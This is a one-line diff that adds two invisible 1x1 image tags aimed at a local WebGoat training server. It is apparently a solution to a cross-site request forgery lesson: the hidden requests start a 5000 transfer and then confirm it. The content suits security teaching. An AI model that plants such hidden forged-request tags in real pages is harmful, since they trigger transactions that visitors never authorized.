@@ -1,0 +1,1 @@
+<img id="i1" src="http://localhost:9867/WebGoat/attack?scr=2094584595&&menu=900&transfer=5000" " width="1" height="1"> <img id="i2" src="http://localhost:9867/WebGoat/attack?transfer=CONFIRMED" width="1" height="1">
